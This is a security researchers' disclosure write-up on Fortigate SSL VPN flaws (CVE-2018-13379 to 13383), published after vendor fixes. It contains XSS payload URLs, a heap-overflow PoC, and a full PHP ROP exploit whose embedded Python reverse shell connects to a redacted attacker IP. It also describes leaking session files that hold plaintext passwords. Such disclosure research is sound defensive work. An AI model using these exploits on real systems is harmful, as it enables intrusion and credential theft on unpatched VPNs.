---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/
title: "Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | Orange Tsai"
author: "Orange Tsai"
published: 2019-08-09T16:00:00.000Z
description: "Author: Meh Chang(@mehqq_) and Orange Tsai(@orange_8361) Last month, we talked about Palo Alto Networks GlobalProtect RCE as an appetizer. Today, here comes the main dish! If you cannot go to Black H"
---

* * *

![preview](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/d33f700b857adff7-01.png)

_Author: Meh Chang( [@mehqq\_](https://twitter.com/mehqq_)) and Orange Tsai( [@orange\_8361](https://twitter.com/orange_8361))_

Last month, we talked about [Palo Alto Networks GlobalProtect RCE](https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/) as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!

- [Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)

We will also give a speech at the following conferences, just come and find us!

- [HITCON](https://hitcon.org/2019/CMT/agenda) \- Aug. 23 @ Taipei (Chinese)
- [HITB GSEC](https://gsec.hitb.org/sg2019/agenda/) \- Aug. 29,30 @ Singapore
- [RomHack](https://www.romhack.io/program_en-2019.html) \- Sep. 28 @ Rome
- and more …

# [Let’s start!](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Let%E2%80%99s-start "Let’s start!") Let’s start!

The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!

However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.

At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/1f5b29bb7e8204af-02.png)

It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking **Fortigate SSL VPN**. The next article is going to be about **Pulse Secure**, which is the most splendid one! Stay tuned!

# [Fortigate SSL VPN](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Fortigate-SSL-VPN "Fortigate SSL VPN") Fortigate SSL VPN

Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL `/remote/login`. Here is the technical feature of Fortigate:

## [All-in-one binary](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#All-in-one-binary "All-in-one binary") All-in-one binary

We started our research from the file system. We tried to list the binaries in `/bin/` and found there are all symbolic links, pointing to `/bin/init`. Just like this:

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/db671ce5a5260519-03.png)

Fortigate compiles all the programs and configurations into a single binary, which makes the `init` really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no `/bin/ls` or `/bin/cat`!

## [Web daemon](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Web-daemon "Web daemon") Web daemon

There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with `/bin/httpsd` on the port 443. The other is normal user interface, handled with `/bin/sslvpnd` on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.

Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.

In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!

## [WebVPN](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#WebVPN "WebVPN") WebVPN

WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.

# [Vulnerabilities](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Vulnerabilities "Vulnerabilities") Vulnerabilities

We found several vulnerabilities:

## [CVE-2018-13379: Pre-auth arbitrary file reading](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13379-Pre-auth-arbitrary-file-reading "CVE-2018-13379: Pre-auth arbitrary file reading")[CVE-2018-13379](https://fortiguard.com/psirt/FG-IR-18-384): Pre-auth arbitrary file reading

While fetching corresponding language file, it builds the json file path with the parameter `lang`:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);<br>``` |

There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of `snprintf`. According to the man page, it writes **at most size-1** into the output string. Therefore, we only need to make it exceed the buffer size and the `.json` will be stripped. Then we can read whatever we want.

## [CVE-2018-13380: Pre-auth XSS](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13380-Pre-auth-XSS "CVE-2018-13380: Pre-auth XSS")[CVE-2018-13380](https://fortiguard.com/psirt/FG-IR-18-383): Pre-auth XSS

There are several XSS:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>/message?title=x&msg=%26%23<svg/onload=alert(1)>;<br>``` |

## [CVE-2018-13381: Pre-auth heap overflow](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13381-Pre-auth-heap-overflow "CVE-2018-13381: Pre-auth heap overflow")[CVE-2018-13381](https://fortiguard.com/psirt/FG-IR-18-387): Pre-auth heap overflow

While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for `<` is `&#60;` and this should occupies 5 bytes. If it encounter anything starts with `&#`, such as `&#60;`, it consider there is a token already encoded, and count its length directly. Like this:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>c = token[idx];<br>if (c == '(' || c == ')' || c == '#' || c == '<' || c == '>')<br>    cnt += 5;<br>else if(c == '&' && html[idx+1] == '#')<br>    cnt += len(strchr(html[idx], ';')-idx);<br>``` |

However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>``` | ```<br>switch (c)<br>{<br>    case '<':<br>        memcpy(buf[counter], "&#60;", 5);<br>        counter += 4;<br>        break;<br>    case '>':<br>    // ...<br>    default:<br>        buf[counter] = c;<br>        break;<br>    counter++;<br>}<br>``` |

If we input a malicious string like `&#<<<;`, the `<` is still encoded into `&#60;`, so the result should be `&#&#60;&#60;&#60;;`! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.

PoC:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br>import requests<br>data = {<br>    'title': 'x', <br>    'msg': '&#' + '<'*(0x20000) + ';<', <br>}<br>r = requests.post('https://sslvpn:4433/message', data=data)<br>``` |

## [CVE-2018-13382: The magic backdoor](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13382-The-magic-backdoor "CVE-2018-13382: The magic backdoor")[CVE-2018-13382](https://fortiguard.com/psirt/FG-IR-18-389): The magic backdoor

In the login page, we found a special parameter called `magic`. Once the parameter meets a hardcoded string, we can modify any user’s password.

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/b539a62d49af415b-04.png)

According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been [reproduced by the researcher from CodeWhite](https://twitter.com/codewhitesec/status/1145967317672714240). It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!

Twitter Embed

> Critical vulns in [#FortiOS](https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw) reversed & exploited by our colleagues [@niph\_](https://twitter.com/niph_?ref_src=twsrc%5Etfw) and [@ramoliks](https://twitter.com/ramoliks?ref_src=twsrc%5Etfw) \- patch your [#FortiOS](https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw) asap and see the [#bh2019](https://twitter.com/hashtag/bh2019?src=hash&ref_src=twsrc%5Etfw) talk of [@orange\_8361](https://twitter.com/orange_8361?ref_src=twsrc%5Etfw) and [@mehqq\_](https://twitter.com/mehqq_?ref_src=twsrc%5Etfw) for details (tnx guys for the teaser that got us started) [pic.twitter.com/TLLEbXKnJ4](https://t.co/TLLEbXKnJ4)
>
> — CODE WHITE GmbH (@codewhitesec) [July 2, 2019](https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw)

## [CVE-2018-13383: Post-auth heap overflow](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13383-Post-auth-heap-overflow "CVE-2018-13383: Post-auth heap overflow")[CVE-2018-13383](https://fortiguard.com/psirt/FG-IR-18-388): Post-auth heap overflow

This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>memcpy(buffer, js_buf, js_buf_len);<br>``` |

The buffer size is fixed to `0x2000`, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.

To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.

# [Exploitation](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Exploitation "Exploitation") Exploitation

The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.

## [CVE-2018-13381](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13381 "CVE-2018-13381") CVE-2018-13381

Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.

### [Single thread, single process, single allocator](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Single-thread-single-process-single-allocator "Single thread, single process, single allocator") Single thread, single process, single allocator

The web daemon handles multiple connection with `epoll()`, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.

### [Operations regularly triggered](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Operations-regularly-triggered "Operations regularly triggered") Operations regularly triggered

This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.

### [Apache additional memory management.](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Apache-additional-memory-management "Apache additional memory management.") Apache additional memory management.

The memory won’t be `free()` until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.

### [JeMalloc](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#JeMalloc "JeMalloc") JeMalloc

JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.

We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!

## [CVE-2018-13379 + CVE-2018-13383](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#CVE-2018-13379-CVE-2018-13383 "CVE-2018-13379 + CVE-2018-13383") CVE-2018-13379 + CVE-2018-13383

This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.

### [Gain authentication](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Gain-authentication "Gain authentication") Gain authentication

We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/a5cee0d1b1841e68-05.png)

### [Get the shell](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Get-the-shell "Get the shell") Get the shell

After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.

Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something **regularly** appears! It would be great if it is **everywhere**, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.

We got an interesting crash. To our great surprise, we almost control the program counter!

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/7073c39fdcd4af5d-06.png)

Here is the crash, and that’s why we love fuzzing! ;)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>Program received signal SIGSEGV, Segmentation fault.<br>0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1<br>2: /x $rax = 0x41414141<br>1: x/i $pc<br>=> 0x7fb908d12a77 <SSL_do_handshake+23>: callq *0x60(%rax)<br>(gdb)<br>``` |

The crash happened in [`SSL_do_handshake()`](https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>``` | ```<br>int SSL_do_handshake(SSL *s)<br>{<br>    // ...<br>    s->method->ssl_renegotiate_check(s, 0);<br>    if (SSL_in_init(s) || SSL_in_before(s)) {<br>        if ((s->mode & SSL_MODE_ASYNC) && ASYNC_get_current_job() == NULL) {<br>            struct ssl_async_args args;<br>            args.s = s;<br>            ret = ssl_start_async_job(s, &args, ssl_do_handshake_intern);<br>        } else {<br>            ret = s->handshake_func(s);<br>        }<br>    }<br>    return ret;<br>}<br>``` |

We overwrote the function table inside [`struct SSL`](https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080) called [method](https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087), so when the program trying to execute `s->method->ssl_renegotiate_check(s, 0);`, it crashed.

This is actually an ideal target of our exploit! The allocation of `struct SSL` can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that `ret = s->handshake_func(s);` calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.

We first **spray** the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.

![](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/490ed485b4e41704-07.png)

Here we put our php PoC on an HTTP server:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>``` | ```<br><?php<br>    function p64($address) {<br>        $low = $address & 0xffffffff;<br>        $high = $address >> 32 & 0xffffffff;<br>        return pack("II", $low, $high);<br>    }<br>    $junk = 0x4141414141414141;<br>    $nop_func = 0x32FC078;<br>    $gadget  = p64($junk);<br>    $gadget .= p64($nop_func - 0x60);<br>    $gadget .= p64($junk);<br>    $gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ;<br>    $gadget .= p64($junk);<br>    $gadget .= p64($junk);<br>    $gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;<br>    $gadget .= p64(0x1bed1f6); // pop rax ; ret ;<br>    $gadget .= p64(0x58);<br>    $gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret  ;<br>    $gadget .= p64(0x1366639); // call system ;<br>    $gadget .= "python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;";<br>    $p  = str_repeat('AAAAAAAA', 1024+512-4); // offset<br>    $p .= $gadget;<br>    $p .= str_repeat('A', 0x1000 - strlen($gadget));<br>    $p .= $gadget;<br>?><br><a href="javascript:void(0);<?=$p;?>">xxx</a><br>``` |

The PoC can be divided into three parts.

### [1. Fake SSL structure](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#1-Fake-SSL-structure "1. Fake SSL structure") 1\. Fake SSL structure

The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the `method` to a place containing a void function pointer. The parameter at this time is SSL structure itself `s`. However, there is only 8 bytes ahead of `method`. We cannot simply call `system("/bin/sh");` on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;<br>``` |

So we set the `handshake_func` to this gadget, move the `rsp` to our SSL structure, and do further ROP attack.

### [2. ROP chain](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#2-ROP-chain "2. ROP chain") 2\. ROP chain

The ROP chain here is simple. We slightly move the `rdi` forward so there is enough space for our reverse shell command.

### [3. Overflow string](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#3-Overflow-string "3. Overflow string") 3\. Overflow string

Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.

Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the `SSL_do_handshake`. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.

# [Demo](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Demo "Demo") Demo

Fortigate SSL VPN PreAuth Remote Code Execution - YouTube

Tap to unmute

[Fortigate SSL VPN PreAuth Remote Code Execution](https://www.youtube.com/watch?v=Aw55HqZW4x0) [Orange Tsai](https://www.youtube.com/channel/UCnweRFxfA-xpTbkb83yfBog)

Orange Tsai3.75K subscribers

[Watch on](https://www.youtube.com/watch?v=Aw55HqZW4x0)

# [Timeline](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Timeline "Timeline") Timeline

- 11 December, 2018 Reported to Fortinet
- 19 March, 2019 All fix scheduled
- 24 May, 2019 All advisory released

# [Fix](https://blog.orange.tw/posts/2019-08-attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn/\#Fix "Fix") Fix

Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.

Twitter Widget Iframe